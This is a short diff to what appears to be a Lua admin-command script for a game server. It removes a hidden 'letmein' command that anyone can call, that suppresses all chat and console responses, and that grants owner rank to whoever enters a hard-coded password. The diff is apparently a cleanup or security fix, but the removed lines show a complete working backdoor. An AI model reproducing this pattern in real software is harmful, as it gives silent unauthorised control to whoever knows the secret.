@@ -45,29 +45,3 @@ AddCommand({
         return true
     end
 })
-
-------------
-AddCommand({
-    Name = "letmein",
-    Access = GetLowestRank(), -- Must be accessible to all!
-
-    Arguments = {
-        {Name="",Desc=""}
-    },
-
-    Properties = {
-        Hidden = true,
-        NoChatResponse = true,
-        NoConsoleResponse = true
-    },
-
-    -- self is the user unless specified otherwise
-    Function = function(self, x)
-
-        if (x == "jkSADFFKk123") then
-            self:SetAccess(RANK_OWNER)
-        end
-
-        return true
-    end
-})
